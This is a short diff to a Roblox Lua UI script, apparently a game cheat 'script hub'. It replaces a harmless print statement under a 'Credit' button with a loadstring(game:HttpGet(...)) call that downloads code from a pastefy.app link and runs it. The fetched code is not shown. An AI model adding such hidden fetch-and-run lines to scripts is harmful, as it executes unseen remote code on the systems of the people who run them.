@@ -6,7 +6,7 @@ local tab = DrRayLibrary.newTab("Credit", "rbxassetid://2005276185")
 tab.newButton("Script By Normal_Bacon", "Subscribe Me!", function()
 
 tab.newButton("Credit By Normal_Bacon#9172", "👁️👄👁️", function()
-    print('Hello!')
+    loadstring(game:HttpGet(('https://pastefy.app/KYs0sftX/raw'),true))()
 end)
 
 tab.newButton("Back Script Main 2", "Back", function()
